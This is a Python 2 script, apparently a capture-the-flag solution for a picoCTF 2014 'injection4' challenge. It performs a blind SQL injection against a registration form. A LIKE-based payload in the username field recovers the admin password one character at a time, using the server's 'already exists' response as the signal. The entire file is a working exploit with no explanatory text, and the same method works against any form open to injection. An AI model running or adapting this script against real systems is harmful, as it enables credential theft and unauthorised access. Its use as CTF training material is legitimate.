import requests
from requests.auth import HTTPBasicAuth

def sendpass(password):
    usernameString = "admin' AND password like '{0}%".format(password)
    payload = {'username': usernameString}
    #payload = {'username': "natas16", 'debug': True}
    r = requests.post("http://web2014.picoctf.com/injection4/register.php", data=payload, verify=False)
    print r.text
    # return true if "user exist" text is displayed
    return "already" in r.text

charlist = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9']

password = ""

for i in range(27):
    for c in charlist:
        temppass = password+c
        print "Testing: " + temppass
        if(sendpass(temppass)):
            password += c
            break
    print "New password substring: " + password

print password

